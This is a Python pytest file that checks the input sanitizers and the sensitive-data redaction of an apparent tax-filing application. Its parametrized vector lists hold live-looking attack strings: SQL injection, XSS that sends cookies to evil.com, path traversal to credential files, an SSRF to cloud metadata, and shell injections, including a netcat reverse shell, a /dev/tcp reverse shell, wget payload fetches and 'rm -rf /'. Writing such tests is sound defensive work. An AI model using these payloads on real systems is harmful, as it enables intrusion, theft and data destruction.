"""Comprehensive input validation and sanitization tests.

Covers SQL injection, XSS, path traversal, command injection, SSRF,
header injection, and all validation functions from validation.py and
data_sanitizer.py.
"""

import os
import sys
from pathlib import Path
from decimal import Decimal

import pytest
from unittest.mock import Mock, MagicMock, patch

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from security.validation import (
    sanitize_string,
    sanitize_email,
    sanitize_phone,
    sanitize_integer,
    sanitize_decimal,
    sanitize_tax_amount,
    sanitize_ssn,
    sanitize_ein,
    sanitize_tax_year,
    sanitize_filing_status,
    sanitize_filename,
    sanitize_list,
    validate_tax_return_data,
    ValidationError,
)
from security.data_sanitizer import (
    DataSanitizer,
    REDACTED,
    SENSITIVE_FIELDS,
    PATTERNS,
    get_sanitizer,
    sanitize_for_logging,
    sanitize_for_api,
)


# ===========================================================================
# SQL Injection Vectors
# ===========================================================================

SQL_INJECTION_VECTORS = [
    pytest.param("' OR '1'='1", id="sqli_or_1_eq_1"),
    pytest.param("'; DROP TABLE users; --", id="sqli_drop_table"),
    pytest.param("' UNION SELECT * FROM users --", id="sqli_union_select"),
    pytest.param("1; EXEC xp_cmdshell('cmd')", id="sqli_exec_cmdshell"),
    pytest.param("' OR 1=1 --", id="sqli_or_1eq1_comment"),
    pytest.param("' OR ''='", id="sqli_or_empty"),
    pytest.param("1' ORDER BY 1--+", id="sqli_order_by"),
    pytest.param("1' GROUP BY 1--+", id="sqli_group_by"),
    pytest.param("' HAVING 1=1 --", id="sqli_having"),
    pytest.param("admin'--", id="sqli_admin_comment"),
    pytest.param("' OR 'x'='x", id="sqli_or_x_eq_x"),
    pytest.param("') OR ('1'='1", id="sqli_paren_or"),
    pytest.param("' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", id="sqli_convert"),
    pytest.param("'; WAITFOR DELAY '0:0:5' --", id="sqli_waitfor"),
    pytest.param("' OR SLEEP(5) --", id="sqli_sleep"),
    pytest.param("' UNION SELECT NULL,NULL,NULL --", id="sqli_union_null"),
    pytest.param("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", id="sqli_blind_sleep"),
    pytest.param("' OR 1=1#", id="sqli_hash_comment"),
    pytest.param("-1' UNION SELECT 1,2,3--+", id="sqli_union_numeric"),
    pytest.param("' OR EXISTS(SELECT 1 FROM dual) --", id="sqli_exists"),
    pytest.param("1; INSERT INTO users VALUES('hacker','pass')--", id="sqli_insert"),
    pytest.param("1; UPDATE users SET password='hacked' WHERE 1=1--", id="sqli_update"),
    pytest.param("1; DELETE FROM users WHERE 1=1--", id="sqli_delete"),
    pytest.param("' UNION ALL SELECT @@version --", id="sqli_version"),
    pytest.param("'; DECLARE @q NVARCHAR(4000);SET @q='';EXEC(@q)--", id="sqli_declare"),
    pytest.param("' OR 1=1 LIMIT 1 --", id="sqli_limit"),
    pytest.param("' UNION SELECT username,password FROM users--", id="sqli_union_creds"),
    pytest.param("1 AND 1=1", id="sqli_numeric_and"),
    pytest.param("1 AND 1=2", id="sqli_numeric_and_false"),
    pytest.param("' OR 'a'='a", id="sqli_or_a_eq_a"),
    pytest.param("1' AND '1'='1", id="sqli_and_true"),
    pytest.param("' UNION SELECT table_name FROM information_schema.tables WHERE '1'='1", id="sqli_info_schema"),
    pytest.param("0x27", id="sqli_hex_quote"),
    pytest.param("%27", id="sqli_url_encoded_quote"),
    pytest.param("' OR 1 IN (SELECT @@version) --", id="sqli_in_select"),
    pytest.param("1; SHUTDOWN --", id="sqli_shutdown"),
    pytest.param("'; CREATE TABLE hacked(id INT)--", id="sqli_create_table"),
    pytest.param("' OR 1=1; EXEC master..xp_cmdshell 'dir' --", id="sqli_xp_dir"),
    pytest.param("' OR 1=1 OFFSET 0 ROWS FETCH NEXT 10 ROWS ONLY --", id="sqli_offset_fetch"),
    pytest.param("'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' --", id="sqli_grant"),
    pytest.param("1 UNION SELECT LOAD_FILE('/etc/passwd')--", id="sqli_load_file"),
    pytest.param("' INTO OUTFILE '/tmp/hacked.txt' --", id="sqli_outfile"),
    pytest.param("1; DROP DATABASE production--", id="sqli_drop_db"),
    pytest.param("'; ALTER TABLE users ADD admin_flag BOOLEAN DEFAULT TRUE--", id="sqli_alter"),
    pytest.param("' OR pg_sleep(5)--", id="sqli_pg_sleep"),
    pytest.param("'; COPY users TO '/tmp/data.csv'--", id="sqli_copy"),
    pytest.param("' AND SUBSTRING(@@version,1,1)='5'--", id="sqli_substring"),
    pytest.param("' AND ASCII(SUBSTR(username,1,1))>65--", id="sqli_ascii_substr"),
    pytest.param("1' BENCHMARK(10000000,SHA1('test'))--", id="sqli_benchmark"),
    pytest.param("' OR IF(1=1,1,0)=1--", id="sqli_if"),
]


class TestSQLInjectionSanitization:
    """SQL injection vectors must be safely handled by sanitize_string."""

    @pytest.mark.parametrize("vector", SQL_INJECTION_VECTORS)
    def test_sanitize_string_escapes_sql(self, vector):
        result = sanitize_string(vector)
        # The sanitized output should have HTML-escaped quotes at minimum
        # and should not contain raw SQL keywords that could be dangerous
        assert isinstance(result, str)
        # Raw single quotes should be escaped
        assert "'" not in result or "&" in result

    @pytest.mark.parametrize("vector", SQL_INJECTION_VECTORS)
    def test_sql_vector_as_email_rejected(self, vector):
        """SQL injection in email field should be rejected."""
        result = sanitize_email(vector)
        assert result is None

    @pytest.mark.parametrize("vector", SQL_INJECTION_VECTORS)
    def test_sql_vector_as_ssn_rejected(self, vector):
        """SQL injection in SSN field should be rejected."""
        result = sanitize_ssn(vector)
        assert result is None

    @pytest.mark.parametrize("vector", SQL_INJECTION_VECTORS)
    def test_sql_vector_as_filename_sanitized(self, vector):
        """SQL injection in filename should be sanitized."""
        result = sanitize_filename(vector)
        if result is not None:
            # Core dangerous chars removed
            assert "'" not in result
            assert ";" not in result
            # Filename result should either differ from vector or be
            # purely alphanumeric (safe as-is, e.g. "0x27")
            if result == vector:
                assert result.replace("_", "").replace("-", "").replace(".", "").isalnum()


# ===========================================================================
# XSS Vectors
# ===========================================================================

XSS_VECTORS = [
    pytest.param("<script>alert(1)</script>", id="xss_script_tag"),
    pytest.param("<script>alert('XSS')</script>", id="xss_script_alert"),
    pytest.param("<img src=x onerror=alert(1)>", id="xss_img_onerror"),
    pytest.param("<svg onload=alert(1)>", id="xss_svg_onload"),
    pytest.param("<body onload=alert(1)>", id="xss_body_onload"),
    pytest.param("<iframe src='javascript:alert(1)'>", id="xss_iframe_js"),
    pytest.param("javascript:alert(1)", id="xss_javascript_proto"),
    pytest.param("<a href='javascript:alert(1)'>click</a>", id="xss_a_href_js"),
    pytest.param("<div onmouseover='alert(1)'>hover</div>", id="xss_onmouseover"),
    pytest.param("'\"><script>alert(1)</script>", id="xss_breakout_script"),
    pytest.param("<img src=\"javascript:alert('XSS')\">", id="xss_img_src_js"),
    pytest.param("<input onfocus=alert(1) autofocus>", id="xss_input_onfocus"),
    pytest.param("<marquee onstart=alert(1)>", id="xss_marquee"),
    pytest.param("<details open ontoggle=alert(1)>", id="xss_details_ontoggle"),
    pytest.param("<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">", id="xss_math_xlink"),
    pytest.param("<table background='javascript:alert(1)'>", id="xss_table_bg"),
    pytest.param("<object data='javascript:alert(1)'>", id="xss_object_data"),
    pytest.param("<embed src='javascript:alert(1)'>", id="xss_embed_src"),
    pytest.param("<base href='javascript:alert(1)//'>", id="xss_base_href"),
    pytest.param("<form action='javascript:alert(1)'><input type=submit>", id="xss_form_action"),
    pytest.param("{{constructor.constructor('return this')()}}", id="xss_template_injection"),
    pytest.param("${alert(1)}", id="xss_template_literal"),
    pytest.param("<script>document.location='http://evil.com/steal?c='+document.cookie</script>", id="xss_cookie_steal"),
    pytest.param("<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>", id="xss_base64_eval"),
    pytest.param("<svg/onload=alert(1)>", id="xss_svg_no_space"),
    pytest.param("<script>fetch('http://evil.com?'+document.cookie)</script>", id="xss_fetch_cookie"),
    pytest.param("'-alert(1)-'", id="xss_js_string_breakout"),
    pytest.param("\";alert(1)//", id="xss_dquote_breakout"),
    pytest.param("<script>new Image().src='http://evil.com/'+document.cookie</script>", id="xss_image_exfil"),
    pytest.param("<img src=x onerror=this.src='http://evil.com/?c='+document.cookie>", id="xss_img_exfil"),
    pytest.param("<style>@import'http://evil.com/xss.css';</style>", id="xss_css_import"),
    pytest.param("<link rel=stylesheet href='http://evil.com/xss.css'>", id="xss_link_css"),
    pytest.param("<video><source onerror=alert(1)>", id="xss_video_source"),
    pytest.param("<audio src=x onerror=alert(1)>", id="xss_audio_onerror"),
    pytest.param("<isindex action='javascript:alert(1)'>", id="xss_isindex"),
    pytest.param("<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>", id="xss_meta_refresh"),
    pytest.param("<event-source src='http://evil.com/event'>", id="xss_event_source"),
    pytest.param("<!--<script>alert(1)</script>-->", id="xss_html_comment"),
    pytest.param("<scr<script>ipt>alert(1)</scr</script>ipt>", id="xss_nested_script"),
    pytest.param("%3Cscript%3Ealert(1)%3C/script%3E", id="xss_url_encoded"),
    pytest.param("&#60;script&#62;alert(1)&#60;/script&#62;", id="xss_html_entities"),
    pytest.param("<IMG SRC=JaVaScRiPt:alert('XSS')>", id="xss_mixed_case"),
    pytest.param("<script>alert(String.fromCharCode(88,83,83))</script>", id="xss_fromcharcode"),
    pytest.param("<img src=x onerror=\"&#0000106avascript:alert(1)\">", id="xss_null_byte_js"),
    pytest.param("<div style='background:url(javascript:alert(1))'>", id="xss_css_url"),
    pytest.param("<div style='behavior:url(xss.htc)'>", id="xss_htc_behavior"),
    pytest.param("<xml><x><![CDATA[<script>alert(1)</script>]]></x></xml>", id="xss_cdata"),
    pytest.param("<button onclick=alert(1)>click</button>", id="xss_button_onclick"),
    pytest.param("<select onfocus=alert(1) autofocus>", id="xss_select_onfocus"),
    pytest.param("<textarea onfocus=alert(1) autofocus>", id="xss_textarea_onfocus"),
]


class TestXSSSanitization:
    """XSS vectors must be HTML-escaped by sanitize_string."""

    @pytest.mark.parametrize("vector", XSS_VECTORS)
    def test_sanitize_string_escapes_xss(self, vector):
        result = sanitize_string(vector)
        # No raw < or > should survive escaping
        assert "<script" not in result.lower()
        assert "<img" not in result.lower() or "&lt;" in result
        assert "onerror=" not in result.lower() or "&" in result

    @pytest.mark.parametrize("vector", XSS_VECTORS)
    def test_xss_vector_as_email_rejected(self, vector):
        result = sanitize_email(vector)
        assert result is None

    @pytest.mark.parametrize("vector", XSS_VECTORS)
    def test_xss_vector_in_data_sanitizer(self, vector):
        sanitizer = DataSanitizer()
        result = sanitizer.sanitize_string(vector)
        assert isinstance(result, str)


# ===========================================================================
# Path Traversal Vectors
# ===========================================================================

PATH_TRAVERSAL_VECTORS = [
    pytest.param("../../../etc/passwd", id="path_unix_relative"),
    pytest.param("..\\..\\..\\windows\\system32\\config\\sam", id="path_windows_relative"),
    pytest.param("/etc/passwd", id="path_absolute_unix"),
    pytest.param("....//....//etc/passwd", id="path_double_dot_slash"),
    pytest.param("..%2f..%2f..%2fetc%2fpasswd", id="path_url_encoded_slash"),
    pytest.param("..%252f..%252f..%252fetc%252fpasswd", id="path_double_url_encoded"),
    pytest.param("%2e%2e%2f%2e%2e%2fetc%2fpasswd", id="path_encoded_dots"),
    pytest.param("..%c0%af..%c0%afetc/passwd", id="path_overlong_utf8"),
    pytest.param("....\\\\....\\\\etc\\passwd", id="path_double_backslash"),
    pytest.param("file:///etc/passwd", id="path_file_protocol"),
    pytest.param("/proc/self/environ", id="path_proc_environ"),
    pytest.param("/dev/null", id="path_dev_null"),
    pytest.param("~/.ssh/id_rsa", id="path_home_ssh"),
    pytest.param(".env", id="path_dotenv"),
    pytest.param("../.env", id="path_parent_dotenv"),
    pytest.param("C:\\Windows\\System32\\cmd.exe", id="path_windows_cmd"),
    pytest.param("/var/log/auth.log", id="path_auth_log"),
    pytest.param("....//....//....//etc/shadow", id="path_shadow"),
    pytest.param("..%00/etc/passwd", id="path_null_byte"),
    pytest.param("\\\\server\\share\\file", id="path_unc"),
]


class TestPathTraversalSanitization:
    """Path traversal attacks must be blocked by sanitize_filename."""

    @pytest.mark.parametrize("vector", PATH_TRAVERSAL_VECTORS)
    def test_filename_sanitization(self, vector):
        result = sanitize_filename(vector)
        if result is not None:
            assert ".." not in result
            assert "/" not in result
            assert "\\" not in result

    @pytest.mark.parametrize("vector", PATH_TRAVERSAL_VECTORS)
    def test_sanitize_string_handles_path_traversal(self, vector):
        result = sanitize_string(vector)
        assert isinstance(result, str)


# ===========================================================================
# Command Injection Vectors
# ===========================================================================

COMMAND_INJECTION_VECTORS = [
    pytest.param("; ls -la", id="cmd_semicolon_ls"),
    pytest.param("| cat /etc/passwd", id="cmd_pipe_cat"),
    pytest.param("`whoami`", id="cmd_backtick_whoami"),
    pytest.param("$(id)", id="cmd_dollar_paren_id"),
    pytest.param("&& rm -rf /", id="cmd_and_rm"),
    pytest.param("|| curl http://evil.com", id="cmd_or_curl"),
    pytest.param("; wget http://evil.com/shell.sh", id="cmd_wget"),
    pytest.param("| nc -e /bin/sh evil.com 4444", id="cmd_netcat"),
    pytest.param("`curl http://evil.com/$(whoami)`", id="cmd_nested_backtick"),
    pytest.param("; echo $PATH", id="cmd_echo_path"),
    pytest.param("$(cat /etc/shadow)", id="cmd_cat_shadow"),
    pytest.param("; python -c 'import os; os.system(\"id\")'", id="cmd_python_exec"),
    pytest.param("| bash -i >& /dev/tcp/evil.com/4444 0>&1", id="cmd_reverse_shell"),
    pytest.param("; /bin/bash -c 'cat /etc/passwd'", id="cmd_bash_c"),
    pytest.param("$(touch /tmp/pwned)", id="cmd_touch_file"),
]


class TestCommandInjectionSanitization:
    """Command injection vectors in string sanitization."""

    @pytest.mark.parametrize("vector", COMMAND_INJECTION_VECTORS)
    def test_sanitize_string_handles_cmd_injection(self, vector):
        result = sanitize_string(vector)
        assert isinstance(result, str)
        # Backticks and $ should be safe after HTML escaping
        # The key point is these are sanitized strings, not executed

    @pytest.mark.parametrize("vector", COMMAND_INJECTION_VECTORS)
    def test_cmd_injection_as_email_rejected(self, vector):
        result = sanitize_email(vector)
        assert result is None

    @pytest.mark.parametrize("vector", COMMAND_INJECTION_VECTORS)
    def test_cmd_injection_as_filename_sanitized(self, vector):
        result = sanitize_filename(vector)
        if result is not None:
            assert "|" not in result
            assert "`" not in result
            assert "$" not in result


# ===========================================================================
# SSRF Vectors
# ===========================================================================

SSRF_VECTORS = [
    pytest.param("http://169.254.169.254/latest/meta-data/", id="ssrf_aws_metadata"),
    pytest.param("http://169.254.169.254/latest/user-data/", id="ssrf_aws_userdata"),
    pytest.param("http://metadata.google.internal/", id="ssrf_gcp_metadata"),
    pytest.param("http://localhost:8080", id="ssrf_localhost"),
    pytest.param("http://127.0.0.1", id="ssrf_loopback"),
    pytest.param("http://0.0.0.0", id="ssrf_zero_addr"),
    pytest.param("http://[::1]", id="ssrf_ipv6_loopback"),
    pytest.param("file:///etc/passwd", id="ssrf_file_proto"),
    pytest.param("gopher://evil.com:25/", id="ssrf_gopher"),
    pytest.param("dict://evil.com:11211/", id="ssrf_dict"),
    pytest.param("http://10.0.0.1", id="ssrf_private_10"),
    pytest.param("http://172.16.0.1", id="ssrf_private_172"),
    pytest.param("http://192.168.1.1", id="ssrf_private_192"),
    pytest.param("http://0x7f000001", id="ssrf_hex_loopback"),
    pytest.param("http://2130706433", id="ssrf_decimal_loopback"),
]


class TestSSRFVectors:
    """SSRF vectors should be sanitized when passed through string sanitization."""

    @pytest.mark.parametrize("vector", SSRF_VECTORS)
    def test_sanitize_string_handles_ssrf(self, vector):
        result = sanitize_string(vector)
        assert isinstance(result, str)

    @pytest.mark.parametrize("vector", SSRF_VECTORS)
    def test_ssrf_as_email_rejected(self, vector):
        result = sanitize_email(vector)
        assert result is None


# ===========================================================================
# Header Injection / CRLF Vectors
# ===========================================================================

HEADER_INJECTION_VECTORS = [
    pytest.param("value\r\nSet-Cookie: hacked=true", id="hdr_set_cookie"),
    pytest.param("value\r\nX-Injected: true", id="hdr_x_injected"),
    pytest.param("value\nHTTP/1.1 200 OK\r\n", id="hdr_response_split"),
    pytest.param("value%0d%0aSet-Cookie:hacked=true", id="hdr_url_encoded_crlf"),
    pytest.param("value\r\nLocation: http://evil.com", id="hdr_redirect"),
    pytest.param("value\r\n\r\n<html>injected</html>", id="hdr_body_inject"),
    pytest.param("value\r\nContent-Length: 0\r\n\r\nfake body", id="hdr_content_length"),
    pytest.param("test\r\nAuthorization: Bearer stolen", id="hdr_auth_inject"),
    pytest.param("name\r\nX-Forwarded-For: 127.0.0.1", id="hdr_xff_inject"),
    pytest.param("data\r\nTransfer-Encoding: chunked", id="hdr_transfer_encoding"),
]


class TestHeaderInjectionSanitization:
    """CRLF / header injection prevention."""

    @pytest.mark.parametrize("vector", HEADER_INJECTION_VECTORS)
    def test_sanitize_string_strips_crlf_by_default(self, vector):
        result = sanitize_string(vector)
        assert "\r" not in result
        assert "\n" not in result

    @pytest.mark.parametrize("vector", HEADER_INJECTION_VECTORS)
    def test_sanitize_email_rejects_crlf(self, vector):
        result = sanitize_email(vector)
        assert result is None


# ===========================================================================
# sanitize_string function
# ===========================================================================

class TestSanitizeString:
    """Direct tests for sanitize_string."""

    def test_basic_string_unchanged(self):
        assert sanitize_string("hello world") == "hello world"

    def test_html_escaped_by_default(self):
        result = sanitize_string("<b>bold</b>")
        assert "&lt;" in result
        assert "&gt;" in result

    def test_allow_html_preserves_tags(self):
        result = sanitize_string("<b>bold</b>", allow_html=True)
        assert "<b>" in result

    def test_max_length_truncates(self):
        result = sanitize_string("a" * 2000, max_length=100)
        assert len(result) <= 100

    def test_null_bytes_removed(self):
        result = sanitize_string("before\x00after")
        assert "\x00" not in result

    def test_newlines_removed_by_default(self):
        result = sanitize_string("line1\nline2\rline3")
        assert "\n" not in result
        assert "\r" not in result

    def test_allow_newlines(self):
        result = sanitize_string("line1\nline2", allow_newlines=True)
        assert "\n" in result

    def test_non_string_converted(self):
        result = sanitize_string(12345)
        assert result == "12345"

    def test_strip_whitespace(self):
        result = sanitize_string("  hello  ")
        assert result == "hello"

    def test_control_characters_removed(self):
        result = sanitize_string("test\x01\x02\x03end")
        assert "\x01" not in result


# ===========================================================================
# sanitize_email
# ===========================================================================

class TestSanitizeEmail:
    """Email validation tests."""

    @pytest.mark.parametrize("email,expected", [
        ("user@example.com", "user@example.com"),
        ("USER@EXAMPLE.COM", "user@example.com"),
        ("test.name+tag@domain.org", "test.name+tag@domain.org"),
        ("a@b.co", "a@b.co"),
    ])
    def test_valid_emails(self, email, expected):
        assert sanitize_email(email) == expected

    @pytest.mark.parametrize("email", [
        "not-an-email",
        "@missing-local.com",
        "missing-domain@",
        "spaces in@email.com",
        "user@.com",
        "",
        "a" * 255 + "@example.com",
        "user@example.com\ninjection",
        "user@example.com;other@example.com",
        None,
        123,
    ])
    def test_invalid_emails(self, email):
        assert sanitize_email(email) is None


# ===========================================================================
# sanitize_phone
# ===========================================================================

class TestSanitizePhone:
    """Phone validation tests."""

    @pytest.mark.parametrize("phone,expected", [
        ("(555) 123-4567", "5551234567"),
        ("555-123-4567", "5551234567"),
        ("5551234567", "5551234567"),
        ("+1-555-123-4567", "15551234567"),
        ("1-555-123-4567", "15551234567"),
    ])
    def test_valid_us_phones(self, phone, expected):
        assert sanitize_phone(phone) == expected

    @pytest.mark.parametrize("phone", [
        "123",
        "12345678901234567890",
        "",
        "abc-def-ghij",
        None,
        123,
    ])
    def test_invalid_phones(self, phone):
        assert sanitize_phone(phone) is None

    def test_international_phone(self):
        result = sanitize_phone("+44 7911 123456", country="UK")
        assert result is not None


# ===========================================================================
# sanitize_integer
# ===========================================================================

class TestSanitizeInteger:
    """Integer validation tests."""

    @pytest.mark.parametrize("value,expected", [
        ("42", 42),
        (42, 42),
        ("0", 0),
        ("-1", -1),
        ("999999", 999999),
    ])
    def test_valid_integers(self, value, expected):
        assert sanitize_integer(value) == expected

    @pytest.mark.parametrize("value", [
        "abc", "12.34", "", None, "1e10", [], {},
    ])
    def test_invalid_integers(self, value):
        assert sanitize_integer(value) is None

    def test_min_value_enforced(self):
        assert sanitize_integer(5, min_value=10) is None
        assert sanitize_integer(10, min_value=10) == 10

    def test_max_value_enforced(self):
        assert sanitize_integer(15, max_value=10) is None
        assert sanitize_integer(10, max_value=10) == 10


# ===========================================================================
# sanitize_decimal
# ===========================================================================

class TestSanitizeDecimal:
    """Decimal validation tests."""

    def test_valid_decimal(self):
        assert sanitize_decimal("12.34") == Decimal("12.34")

    def test_currency_string(self):
        assert sanitize_decimal("$1,234.56") == Decimal("1234.56")

    def test_max_decimal_places(self):
        result = sanitize_decimal("12.999", max_decimal_places=2)
        assert result == Decimal("13.00") or result == Decimal("12.99")

    def test_min_value(self):
        assert sanitize_decimal("-5", min_value=Decimal("0")) is None

    def test_max_value(self):
        assert sanitize_decimal("1000", max_value=Decimal("999")) is None

    def test_invalid_decimal(self):
        assert sanitize_decimal("abc") is None
        assert sanitize_decimal("") is None


# ===========================================================================
# sanitize_tax_amount
# ===========================================================================

class TestSanitizeTaxAmount:
    """Tax amount validation."""

    def test_valid_amount(self):
        assert sanitize_tax_amount("$1,234.56") == Decimal("1234.56")

    def test_zero_amount(self):
        assert sanitize_tax_amount("0") == Decimal("0.00")

    def test_negative_amount_rejected(self):
        assert sanitize_tax_amount("-100") is None

    def test_over_billion_rejected(self):
        assert sanitize_tax_amount("1000000000") is None

    def test_just_under_limit(self):
        assert sanitize_tax_amount("999999999.99") == Decimal("999999999.99")


# ===========================================================================
# sanitize_ssn
# ===========================================================================

class TestSanitizeSSN:
    """SSN validation tests."""

    @pytest.mark.parametrize("ssn,expected", [
        ("123456789", "123-45-6789"),
        ("123-45-6789", "123-45-6789"),
        ("123 45 6789", "123-45-6789"),
    ])
    def test_valid_ssns(self, ssn, expected):
        assert sanitize_ssn(ssn) == expected

    @pytest.mark.parametrize("ssn", [
        "000-00-0001",  # 000 area
        "666-12-3456",  # 666 area
        "900-12-3456",  # 9xx area
        "123-00-6789",  # 00 group
        "123-45-0000",  # 0000 serial
        "12345",        # too short
        "1234567890",   # too long
        "",
        None,
        123,
        "abcdefghi",
    ])
    def test_invalid_ssns(self, ssn):
        assert sanitize_ssn(ssn) is None


# ===========================================================================
# sanitize_ein
# ===========================================================================

class TestSanitizeEIN:
    """EIN validation tests."""

    @pytest.mark.parametrize("ein,expected", [
        ("12-3456789", "12-3456789"),
        ("123456789", "12-3456789"),
    ])
    def test_valid_eins(self, ein, expected):
        assert sanitize_ein(ein) == expected

    @pytest.mark.parametrize("ein", [
        "12345", "1234567890", "", None, 123, "abcdefghi",
    ])
    def test_invalid_eins(self, ein):
        assert sanitize_ein(ein) is None


# ===========================================================================
# sanitize_tax_year
# ===========================================================================

class TestSanitizeTaxYear:
    """Tax year validation."""

    def test_current_year(self):
        from datetime import datetime
        assert sanitize_tax_year(datetime.now().year) == datetime.now().year

    def test_too_old(self):
        assert sanitize_tax_year(1899) is None

    def test_too_far_future(self):
        assert sanitize_tax_year(3000) is None

    def test_valid_year(self):
        assert sanitize_tax_year(2024) == 2024

    def test_string_year(self):
        assert sanitize_tax_year("2024") == 2024


# ===========================================================================
# sanitize_filing_status
# ===========================================================================

class TestSanitizeFilingStatus:
    """Filing status validation."""

    @pytest.mark.parametrize("status,expected", [
        ("single", "single"),
        ("SINGLE", "single"),
        ("married_joint", "married_joint"),
        ("married", "married_joint"),
        ("married filing jointly", "married_joint"),
        ("married filing separately", "married_separate"),
        ("hoh", "head_of_household"),
        ("head_of_household", "head_of_household"),
        ("widow", "qualifying_widow"),
        ("widower", "qualifying_widow"),
    ])
    def test_valid_statuses(self, status, expected):
        assert sanitize_filing_status(status) == expected

    @pytest.mark.parametrize("status", [
        "invalid", "", "divorced", None, 123,
    ])
    def test_invalid_statuses(self, status):
        assert sanitize_filing_status(status) is None


# ===========================================================================
# sanitize_filename
# ===========================================================================

class TestSanitizeFilename:
    """Filename sanitization."""

    def test_valid_filename(self):
        assert sanitize_filename("document.pdf") == "document.pdf"

    def test_removes_path_separators(self):
        result = sanitize_filename("path/to/file.txt")
        assert "/" not in result

    def test_rejects_dot_dot(self):
        assert sanitize_filename("../../../etc/passwd") is None

    def test_special_chars_replaced(self):
        result = sanitize_filename("my file (1).pdf")
        assert result is not None
        assert "(" not in result

    def test_long_filename_truncated(self):
        result = sanitize_filename("a" * 300 + ".pdf")
        assert result is not None
        assert len(result) <= 255

    def test_empty_rejected(self):
        assert sanitize_filename("") is None

    def test_dot_only_rejected(self):
        assert sanitize_filename(".") is None

    def test_none_rejected(self):
        assert sanitize_filename(None) is None


# ===========================================================================
# sanitize_list
# ===========================================================================

class TestSanitizeList:
    """List sanitization."""

    def test_valid_list(self):
        result = sanitize_list(
            ["user@example.com", "invalid", "test@test.com"],
            sanitize_email,
        )
        assert len(result) == 2

    def test_max_items(self):
        result = sanitize_list(
            ["user@example.com"] * 200,
            sanitize_email,
            max_items=50,
        )
        assert len(result) == 50

    def test_not_a_list(self):
        result = sanitize_list("not_a_list", sanitize_email)
        assert result == []


# ===========================================================================
# validate_tax_return_data
# ===========================================================================

class TestValidateTaxReturnData:
    """Tax return data validation."""

    def test_valid_data(self):
        data = {"tax_year": 2024, "filing_status": "single", "income": "50000"}
        result = validate_tax_return_data(data)
        assert result["tax_year"] == 2024

    def test_missing_tax_year_raises(self):
        with pytest.raises(ValidationError, match="tax_year is required"):
            validate_tax_return_data({})

    def test_invalid_tax_year_raises(self):
        with pytest.raises(ValidationError, match="Invalid tax_year"):
            validate_tax_return_data({"tax_year": 1800})

    def test_invalid_filing_status_raises(self):
        with pytest.raises(ValidationError, match="Invalid filing_status"):
            validate_tax_return_data({"tax_year": 2024, "filing_status": "invalid"})

    def test_invalid_ssn_raises(self):
        with pytest.raises(ValidationError, match="Invalid SSN"):
            validate_tax_return_data({"tax_year": 2024, "ssn": "000-00-0000"})

    def test_invalid_income_raises(self):
        with pytest.raises(ValidationError, match="Invalid income"):
            validate_tax_return_data({"tax_year": 2024, "income": "not_a_number"})


# ===========================================================================
# DataSanitizer (data_sanitizer.py)
# ===========================================================================

class TestDataSanitizer:
    """DataSanitizer class tests."""

    def test_sanitize_dict_redacts_ssn_field(self):
        s = DataSanitizer()
        result = s.sanitize_dict({"ssn": "123-45-6789", "name": "John"})
        assert result["ssn"] == REDACTED
        assert result["name"] == "John"

    def test_sanitize_dict_redacts_password(self):
        s = DataSanitizer()
        result = s.sanitize_dict({"password": "secret123", "email": "test@test.com"})
        assert result["password"] == REDACTED

    def test_sanitize_string_redacts_ssn_pattern(self):
        s = DataSanitizer()
        result = s.sanitize_string("My SSN is 123-45-6789")
        assert "123-45-6789" not in result
        assert "SSN-REDACTED" in result

    def test_sanitize_string_redacts_email_partially(self):
        s = DataSanitizer()
        result = s.sanitize_string("Contact: user@example.com")
        assert "user@example.com" not in result

    def test_sanitize_value_none(self):
        s = DataSanitizer()
        assert s.sanitize_value(None) is None

    def test_sanitize_value_int(self):
        s = DataSanitizer()
        assert s.sanitize_value(42) == 42

    def test_sanitize_value_bool(self):
        s = DataSanitizer()
        assert s.sanitize_value(True) is True

    def test_sanitize_nested_dict(self):
        s = DataSanitizer()
        data = {"user": {"ssn": "123-45-6789", "name": "Jane"}}
        result = s.sanitize_dict(data)
        assert result["user"]["ssn"] == REDACTED

    def test_sanitize_for_logging(self):
        s = DataSanitizer()
        result = s.sanitize_for_logging({"ssn": "111-22-3333"}, context="test")
        assert "111-22-3333" not in result
        assert "[test]" in result

    def test_sanitize_for_external_api_filters_fields(self):
        s = DataSanitizer()
        data = {
            "filing_status": "single",
            "ssn": "123-45-6789",
            "password": "secret",
            "tax_year": 2024,
        }
        result = s.sanitize_for_external_api(data)
        assert "ssn" not in result
        assert "password" not in result
        assert "filing_status" in result

    def test_additional_sensitive_fields(self):
        s = DataSanitizer(additional_fields={"custom_secret"})
        result = s.sanitize_dict({"custom_secret": "value", "name": "ok"})
        assert result["custom_secret"] == REDACTED

    def test_sanitize_api_key_pattern(self):
        s = DataSanitizer()
        result = s.sanitize_string("Key: sk-1234567890abcdefghijklm")
        assert "sk-" not in result or "API-KEY-REDACTED" in result


class TestDataSanitizerSingleton:
    """Module-level convenience function tests."""

    def test_get_sanitizer_returns_instance(self):
        s = get_sanitizer()
        assert isinstance(s, DataSanitizer)

    def test_sanitize_for_logging_convenience(self):
        result = sanitize_for_logging({"ssn": "111-22-3333"})
        assert "111-22-3333" not in result

    def test_sanitize_for_api_convenience(self):
        result = sanitize_for_api({"filing_status": "single", "ssn": "123-45-6789"})
        assert "ssn" not in result
